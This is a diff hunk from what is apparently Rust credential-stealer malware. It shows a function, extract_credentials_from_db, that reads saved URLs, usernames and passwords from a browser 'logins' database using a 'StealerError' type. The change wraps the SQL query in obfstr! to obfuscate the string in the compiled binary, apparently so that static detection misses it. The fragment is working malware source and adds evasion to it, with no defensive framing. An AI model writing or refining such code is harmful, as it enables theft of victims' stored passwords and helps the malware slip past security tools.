@@ -176,7 +176,7 @@ fn extract_credentials_from_db(
     let conn = Connection::open(db_path)
         .map_err(|e| StealerError::DatabaseError(e.to_string()))?;
     
-    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")
+    let mut stmt = conn.prepare(obfstr!("SELECT origin_url, username_value, password_value FROM logins"))
         .map_err(|e| StealerError::DatabaseError(e.to_string()))?;
     
     let rows = stmt.query_map([], |row| {
